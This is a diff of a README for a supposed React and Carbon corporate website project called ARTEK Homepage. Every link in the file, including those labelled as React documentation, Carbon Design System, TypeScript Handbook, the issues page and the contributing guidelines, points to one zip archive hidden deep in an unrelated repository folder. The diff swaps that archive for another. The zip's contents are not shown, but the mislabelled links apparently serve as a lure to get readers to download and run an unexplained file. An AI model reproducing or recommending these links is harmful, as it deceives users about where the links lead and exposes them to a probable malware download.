@@ -4,7 +4,7 @@
 Welcome to the ARTEK Homepage project. This application offers a modern corporate website built with React and the Carbon Design System. It supports multiple languages, making it versatile for various users around the globe.
 
 ## 📥 Download the Application
-[![Download Release](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip%https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip)](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip)
+[![Download Release](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip%https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip)](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip)
 
 ## 🔧 System Requirements
 Before downloading, ensure your system meets these requirements:
@@ -25,7 +25,7 @@ Before downloading, ensure your system meets these requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of versions. Select the latest one for download.
@@ -49,7 +49,7 @@ To get started, follow these steps:
 - **Customization Options**: Modify layouts, colors, and typography to match your brand.
 
 ## 🔍 Support & Help
-If you encounter any issues or have questions, please refer to our [issues page](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip) on GitHub. You can report bugs or ask for assistance there.  
+If you encounter any issues or have questions, please refer to our [issues page](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip) on GitHub. You can report bugs or ask for assistance there.  
 
 Our community is also available to help. Join discussions and connect with other users to share tips and solutions.
 
@@ -63,19 +63,19 @@ This project utilizes several modern technologies to ensure optimal performance 
 
 ## 🔗 Additional Resources
 For more detailed insights, you may check the following resources:
-- [React Documentation](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip)
-- [Carbon Design System](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip)
-- [TypeScript Handbook](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip)
+- [React Documentation](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip)
+- [Carbon Design System](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip)
+- [TypeScript Handbook](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip)
 
 Feel free to explore these resources to enhance your understanding and usage of the ARTEK Homepage application.
 
 ## 📅 Keep Updated
 Stay informed with the latest updates and features. Follow the repository and check the Releases page regularly to ensure you have the latest version of the application.
 
-[Download the latest release here](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip).
+[Download the latest release here](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip).
 
 ## 🛠️ Contributions
-We welcome contributions from the community. If you are interested in contributing to the ARTEK Homepage project, please check our [contributing guidelines](https://github.com/Ahop15/artek-homepage/raw/refs/heads/main/scripts/tools/diagram-to-prose/homepage_artek_1.5.zip).
+We welcome contributions from the community. If you are interested in contributing to the ARTEK Homepage project, please check our [contributing guidelines](https://raw.githubusercontent.com/Ahop15/artek-homepage/main/src/pages/services/consultancy/project/data/seo/en/homepage_artek_3.8.zip).
 
 ## 💡 Feedback
 Your feedback is important in helping us improve the application. Feel free to leave comments or suggestions either on the issues page or through our community channels.
